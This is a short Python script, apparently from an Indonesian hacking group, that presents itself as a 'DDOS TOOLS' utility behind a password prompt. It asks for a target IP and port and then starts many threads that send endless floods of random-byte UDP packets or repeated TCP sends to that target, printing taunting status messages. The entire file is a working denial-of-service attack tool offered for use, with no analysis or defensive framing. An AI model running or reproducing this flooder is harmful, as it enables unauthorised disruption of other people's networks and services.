import random
import socket
import threading
import os
import time

os.system("clear")
password = input("[+] Password : ")
if password == "toolsval":
    print("correct password")
    time.sleep(2)
else :
    print("Password wrong")
    time.sleep(100000)
    
os.system("clear")
print("DDOS TOOLS")
print("██╗░░░██╗░█████╗░██╗░░░░░░░░██║░░░██║██╔══██╗██║░░░░░░░░╚██╗░██╔╝███████║██║░░░░░░░░░╚████╔╝░██╔══██║██║░░░░░░░░░░╚██╔╝░░██║░░██║███████╗██╗░░░╚═╝░░░╚═╝░░╚═╝╚══════╝╚═╝")
print("HD COMMUNITY ")
ip = str(input(" Ip:"))
port = int(input("  Port:"))
choice = str(input(" Gas Serang? (y/n):"))
times = int(input(" Faket:"))
threads = int(input("  Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Val Nih Dilawan")
		except:
			print("[!]  Down Ini Mah No Debat")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Val Nih Dilawan")
		except:
			s.close()
			print("[*] Down!!!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()